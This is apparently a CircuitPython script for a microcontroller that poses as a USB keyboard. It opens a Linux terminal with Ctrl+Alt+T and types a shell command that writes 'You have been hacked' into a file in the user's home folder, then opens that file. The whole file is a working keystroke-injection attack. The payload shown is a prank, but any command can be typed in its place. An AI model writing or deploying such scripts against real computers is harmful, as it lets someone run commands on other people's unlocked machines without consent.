import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode



# A dictionary to map characters to keycodes
char_to_keycode = {
    #small letters
    "a": Keycode.A, "b": Keycode.B, "c": Keycode.C, "d": Keycode.D, "e": Keycode.E, "f": Keycode.F,
    "g": Keycode.G, "h": Keycode.H, "i": Keycode.I, "j": Keycode.J, "k": Keycode.K, "l": Keycode.L,
    "m": Keycode.M, "n": Keycode.N, "o": Keycode.O, "p": Keycode.P, "q": Keycode.Q, "r": Keycode.R,
    "s": Keycode.S, "t": Keycode.T, "u": Keycode.U, "v": Keycode.V, "w": Keycode.W, "x": Keycode.X,
    "y": Keycode.Y, "z": Keycode.Z,
    
    #capital letters
    "A": [Keycode.SHIFT, Keycode.A], "B": [Keycode.SHIFT, Keycode.B], "C": [Keycode.SHIFT, Keycode.C],
    "D": [Keycode.SHIFT, Keycode.D], "E": [Keycode.SHIFT, Keycode.E], "F": [Keycode.SHIFT, Keycode.F],
    "G": [Keycode.SHIFT, Keycode.G], "H": [Keycode.SHIFT, Keycode.H], "I": [Keycode.SHIFT, Keycode.I],
    "J": [Keycode.SHIFT, Keycode.J], "K": [Keycode.SHIFT, Keycode.K], "L": [Keycode.SHIFT, Keycode.L],
    "M": [Keycode.SHIFT, Keycode.M], "N": [Keycode.SHIFT, Keycode.N], "O": [Keycode.SHIFT, Keycode.O],
    "P": [Keycode.SHIFT, Keycode.P], "Q": [Keycode.SHIFT, Keycode.Q], "R": [Keycode.SHIFT, Keycode.R],
    "S": [Keycode.SHIFT, Keycode.S], "T": [Keycode.SHIFT, Keycode.T], "U": [Keycode.SHIFT, Keycode.U],
    "V": [Keycode.SHIFT, Keycode.V], "W": [Keycode.SHIFT, Keycode.W], "X": [Keycode.SHIFT, Keycode.X],
    "Y": [Keycode.SHIFT, Keycode.Y], "Z": [Keycode.SHIFT, Keycode.Z],
    
    #numbers
    "1": Keycode.ONE, "2": Keycode.TWO, "3": Keycode.THREE,"4": Keycode.FOUR, "5": Keycode.FIVE,
    "6": Keycode.SIX, "7": Keycode.SEVEN, "8": Keycode.EIGHT, "9": Keycode.NINE, "0": Keycode.ZERO,
    
    #specials
    " ": Keycode.SPACE, "\n": Keycode.ENTER, ",": Keycode.COMMA, ".": Keycode.PERIOD,
    "/": Keycode.FORWARD_SLASH, "-": Keycode.MINUS, "=": Keycode.EQUALS,
    
    # Special characters with Shift
    ":": [Keycode.SHIFT, Keycode.SEMICOLON],
    "!": [Keycode.SHIFT, Keycode.ONE], "@": [Keycode.SHIFT, Keycode.TWO], "#": [Keycode.SHIFT, Keycode.THREE],
    "$": [Keycode.SHIFT, Keycode.FOUR], "%": [Keycode.SHIFT, Keycode.FIVE], "^": [Keycode.SHIFT, Keycode.SIX],
    "&": [Keycode.SHIFT, Keycode.SEVEN], "*": [Keycode.SHIFT, Keycode.EIGHT], "(": [Keycode.SHIFT, Keycode.NINE],
    ")": [Keycode.SHIFT, Keycode.ZERO], "_": [Keycode.SHIFT, Keycode.MINUS], "+": [Keycode.SHIFT, Keycode.EQUALS],
    "<": [Keycode.SHIFT, Keycode.COMMA], ">": [Keycode.SHIFT, Keycode.PERIOD],
    "?": [Keycode.SHIFT, Keycode.FORWARD_SLASH], "|": [Keycode.SHIFT, Keycode.BACKSLASH]
}

def type_string(text):
    for char in text:
        if char in char_to_keycode:
            key = char_to_keycode[char]
            
            if isinstance(key, list):
                keyboard.press(key[0])
                keyboard.press(key[1])
                keyboard.release_all()
            else:    
                keyboard.press(key)
                keyboard.release_all()


keyboard = Keyboard(usb_hid.devices)
time.sleep(2)

keyboard.press(Keycode.CONTROL)
keyboard.press(Keycode.ALT)
keyboard.press(Keycode.T)
keyboard.release_all()
time.sleep(2)
command = "echo 'You have been hacked' > /home/`whoami`/note.txt && mousepad /home/`whoami`/note.txt"
type_string(command)
keyboard.press(Keycode.ENTER)
keyboard.release_all()
